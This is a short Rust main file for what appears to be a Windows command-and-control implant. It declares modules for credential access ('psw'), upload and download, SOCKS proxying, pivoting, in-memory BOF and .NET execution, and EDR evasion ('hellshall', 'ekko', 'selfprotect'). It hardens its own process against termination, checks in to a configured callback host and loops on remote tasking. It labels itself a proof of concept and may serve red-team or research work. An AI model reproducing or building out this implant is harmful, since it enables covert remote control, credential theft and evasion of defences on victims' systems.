mod config;
mod checkin;
mod transport;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod list_processes;
    pub mod pivot;
}
mod hellshall;
mod ekko;
mod selfprotect;
use std::{thread, time::Duration};

use std::{ffi::OsStr, os::windows::ffi::OsStrExt, ptr::null_mut};

use winapi::{
    um::{processthreadsapi::{GetCurrentProcessId}
}};

fn main() {
    let pid = unsafe { 
        GetCurrentProcessId() 
    };

    println!("[*] PID: {}", pid);

    selfprotect::set_process_security_descriptor();

    println!("[*] Process Protected. Press Enter to Exit PoC");

    println!("URL: {}", config::callback_host);
    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        //ekko::smart_ekko((config::callback_interval * 1000) as u32)
        thread::sleep(Duration::from_millis(config::callback_interval * 1000));
    }
}